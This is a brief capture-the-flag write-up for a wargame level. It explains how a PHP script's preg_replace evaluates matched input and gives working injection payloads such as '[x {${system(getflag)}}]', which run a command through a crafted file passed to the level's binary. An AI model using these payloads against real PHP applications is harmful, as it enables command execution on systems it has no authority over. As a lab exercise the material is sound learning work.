## This level contains binary file and a PHP file. The binary actually executs PHP instructions which is in level06.php
## PHP code uses preg_replace function which is vulnerable to command injection
## In code, preg_replace try to match expression associated to this pattern : /(\[x (.*)\])/
## We create a file getflag in tmp directory which contains : [x {${system(getflag)}}]
## and we will run binary level06 passing this /tmp/getflag file in argument

### vim /tmp/getflag && ./level06 /tmp/getflag

### [x {${system(getflag)}}]
or [x ${`getflag`}]

###:wq
